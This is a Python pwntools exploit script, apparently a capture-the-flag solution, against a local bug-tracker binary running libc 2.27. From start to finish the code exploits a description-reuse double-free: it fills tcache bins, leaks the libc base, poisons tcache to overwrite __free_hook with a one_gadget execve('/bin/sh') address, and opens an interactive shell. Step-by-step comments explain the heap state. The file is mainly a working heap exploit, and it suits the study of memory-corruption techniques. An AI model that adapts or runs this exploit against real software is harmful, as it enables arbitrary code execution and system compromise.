#!/usr/bin/env python

from pwn import *

def create_bug(year, id_, title, desc_size, desc, severity):
    p.sendlineafter('> ', '1')
    p.sendlineafter('Enter year: ', str(year))
    p.sendlineafter('Enter id: ', str(id_))
    p.sendlineafter('Enter title (Up to 64 chars): ', title)
    p.sendlineafter('Enter description size: ', str(desc_size))
    if desc:
        p.sendlineafter('Enter description: ', desc)
    p.sendlineafter('Enter Severity: (0: LOW, 1: MEDIUM, 2: HIGH, 3: CRITICAL): ', str(severity))

def delete_bug(index):
    p.sendlineafter('> ', '3')
    p.sendlineafter('Enter bug index: ', str(index))

def show_bug(index):
    p.sendlineafter('> ', '4')
    p.sendlineafter('Enter bug index: ', str(index))

with context.quiet:
    p = process('./program', env = {'LD_PRELOAD': './libc-2.27.so'})

    # bug_list[0]: bug_0 (0x30) => {title_0 (0x50), desc_0 (0x90)}
    create_bug(2001, 1111, 'a' * 62, 128, 'A' * 126, 3)

    # bug_list[1]: bug_1 (0x30) => {title_1 (0x50), desc_1 (0x90)}
    create_bug(2002, 2222, 'b' * 62, 128, 'B' * 126, 3)

    # bug_list[1]      : NULL
    # tcache[0x30] (1) : bug_1
    # tcache[0x50] (1) : title_1
    # tcache[0x90] (1) : desc_1
    delete_bug(1)

    # here is the vulnerability happens. Basically, if we provide a desc size > 255,
    # the program does not allocate a new chunk for its desc, and the previous value
    # in the bug_1's desc field will be reused which desc_1.
    #
    # Basically, since libc-2.27 is using tcache, we should create/delete the same chunk
    # six more times, in order to fill up the tcache bins (maximum is 7). Due to double free
    # vulnerability here, we can free the same chunk (desc_1) several times.
    for i in range(6):
        # bug_list[1]      : bug_1 (0x30) => {title_1 (0x50), desc_1 (0x90)}
        # tcache[0x90] (1) : desc_1
        create_bug(2002, 2222, 'b' * 62, 256, None, 3)

        # bug_list[1]      : NULL
        # tcache[0x30] (1) : bug_1
        # tcache[0x50] (1) : title_1
        # tcache[0x90] (2) : desc_1 -> desc_1
        delete_bug(1)

    # since the tcache[0x90] reached its maximum capacity, desc_0 will be inserted into
    # unsorted_bin list after being freed

    # bug_list[0]      : NULL
    # tcache[0x30] (2) : bug_0   -> bug_1
    # tcache[0x50] (2) : title_0 -> title_1
    # tcache[0x90] (7) : desc_1  -> desc_1 -> ...
    # unsorted_bin     : desc_0
    delete_bug(0)

    # again, using the vulnerability (reusing desc), we can use freed desc_0 in bug_0

    # bug_list[0]      : bug_0 (0x30) => {title_0 (0x50), desc_0 (0x90)}
    # tcache[0x30] (1) : bug_1
    # tcache[0x50] (1) : title_1
    # tcache[0x90] (7) : desc_1  -> desc_1 -> ...
    # unsorted_bin     : desc_0
    create_bug(2001, 1111, 'a' * 62, 256, None, 3)

    # this show will print content of desc_0. However, desc_0 is already freed,
    # so its bk/fd pointers are populated with main arena addresses
    show_bug(0)

    p.recvuntil('Description: ')
    libc_base = u64(p.recv(6) + '\x00\x00') - 0x3ebca0
    print 'libc base: {}'.format(hex(libc_base))

    # now we have the libc base, and we need another double free attack in order to
    # create a fake chunk in the main arena. Therefore, we force the program to create
    # desc_2 and try to free it twice.

    # bug_list[1]      : bug_1 (0x30) => {title_1 (0x50), desc_2 (0x110)}
    # tcache[0x90] (7) : desc_1 -> desc_1 -> ...
    # smallbin         : desc_0
    create_bug(2003, 3333, 'c' * 62, 254, 'C' * 252, 3)

    # after first free, desc_2 is inserted into tcache[0x110]

    # bug_list[1]       : NULL
    # tcache[0x30]  (1) : bug_1
    # tcache[0x50]  (1) : title_1
    # tcache[0x90]  (7) : desc_1  -> desc_1 -> ...
    # tcache[0x110] (1) : desc_2
    # smallbin          : desc_0
    delete_bug(1)

    # by creating another bug, and providing a wrong size, we can force the new
    # bug to use the already freed chunk (desc_2) as its desc.

    # bug_list[1]       : bug_1 (0x30) => {title_1 (0x50), desc_2 (0x110)}
    # tcache[0x90]  (7) : desc_1  -> desc_1 -> ...
    # tcache[0x110] (1) : desc_2
    # smallbin          : desc_0
    create_bug(2003, 3333, 'c' * 62, 256, None, 3)

    # since, desc_2 is already freed, deleting the bug insert desc_2 into tcache[0x110]
    # once again.

    # bug_list[1]       : NULL
    # tcache[0x30]  (1) : bug_1
    # tcache[0x50]  (1) : title_1
    # tcache[0x90]  (7) : desc_1 -> desc_1 -> ...
    # tcache[0x110] (2) : desc_2 -> desc_2
    # smallbin          : desc_0
    delete_bug(1)

    # we are going to create a fake chunk right before __free_hook, we need to insert
    # __free_hook address into tcache[0x110]
    free_hook = libc_base + 0x3ed8e8
    print '__free_hook: {}'.format(hex(free_hook))

    # since desc_2 is pointing to itself, after creating a new bug and allocating desc_2
    # as bug_1's desc, we need to write the address of __free_hook. To the eyes of libc,
    # desc_2 is pointing to the __free_hook as a free chunk

    # bug_list[1]       : bug_1 (0x30) => {title_1 (0x50), desc_2 (0x110)}
    # tcache[0x90]  (7) : desc_1 -> desc_1 -> ...
    # tcache[0x110] (1) : desc_2 -> __free_hook
    # smallbin          : desc_0
    create_bug(2004, 4444, 'd' * 62, 254, p64(free_hook), 3)

    # another bug creation will use the desc_2 in tcache[0x110] and write the __free_hook
    # address as the head of the free list.

    # bug_list[2]       : bug_2 (0x30) => {title_2 (0x50), desc_2 (0x110)}
    # tcache[0x90]  (7) : desc_1 -> desc_1 -> ...
    # tcache[0x110] (0) : __free_hook
    create_bug(2005, 5555, 'e' * 62, 254, 'E' * 252, 3)

    '''
    0x4f322	execve("/bin/sh", rsp+0x40, environ)
    constraints:
        [rsp+0x40] == NULL
    '''
    one_gadget = libc_base + 0x4f322
    print 'one gadget: {}'.format(hex(one_gadget))

    # this bug creation, return __free_hook fake chunk as the desc of bug_3's desc
    # so, we just need to write the address of our one_gadget into the desc.

    # bug_list[3]         : bug_3 (0x30) => {title_3 (0x50), __free_hook}
    # tcache[0x90]  (7)   : desc_1 -> desc_1 -> ...
    # tcache[0x110] (255) :
    create_bug(2006, 6666, 'f' * 62, 254, p64(one_gadget), 3)

    # this triggers the __free_hook and it jumps to our gadget which results in running /bin/sh
    delete_bug(0)

    p.interactive()

